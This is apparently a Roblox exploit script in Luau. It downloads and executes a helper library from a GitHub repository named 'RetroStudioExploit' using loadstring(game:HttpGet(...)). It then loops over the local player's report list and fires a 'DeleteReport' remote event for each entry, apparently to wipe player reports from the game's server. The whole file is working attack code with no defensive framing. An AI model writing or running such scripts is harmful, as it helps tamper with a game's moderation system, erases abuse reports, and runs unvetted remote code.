local head = 'https://raw.githubusercontent.com/'
local github = 'RetroStudioExploit/'
local suffix = '/refs/heads/main/'

function loadScript(url:string)
    return loadstring(game:HttpGet(url))()
end

local LP = game:GetService("Players").LocalPlayer
local ReportLists = LP.PlayerGui["ReportGui v2.0"].OpenFrame.ViewReports.Reports

local REFLECT = loadScript(head .. github .. 'RetroScripts' .. suffix .. 'Globals/Reflect.lua')

for i, _ in ReportLists:GetChildren() do
    local dr:RemoteEvent = REFLECT.getEvent("DeleteReport")
    dr:FireServer(unpack({i, "", "", "", ""}))
end